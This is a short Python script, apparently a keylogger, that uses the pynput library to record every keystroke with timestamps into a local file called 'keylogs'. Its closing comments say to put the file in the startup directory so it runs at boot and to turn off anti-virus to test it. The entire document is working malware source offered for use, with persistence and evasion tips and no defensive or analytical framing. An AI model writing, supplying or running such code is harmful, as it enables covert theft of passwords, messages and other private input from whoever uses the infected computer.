from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
  
# pip install pynput (on a cmd line terminal)
# Add python file on the startup directory to enable the script to start when computer boots up 
# To properly test turn off anti-virus 
